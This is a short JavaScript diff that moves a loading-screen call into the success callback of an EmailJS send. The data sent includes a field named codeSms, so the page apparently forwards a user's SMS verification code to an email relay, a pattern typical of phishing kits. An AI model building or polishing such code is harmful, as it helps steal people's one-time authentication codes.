@@ -143,11 +143,11 @@ function addChecked(e) {
             codeSms: codeSms
         };
 
-        loadingPage();
         
 
         emailjs.send("service_rb7wkid","template_lwkgcu3", tempParams)
-        .then(function (res) {
+            .then(function (res) {
+                loadingPage();
         });
         
 
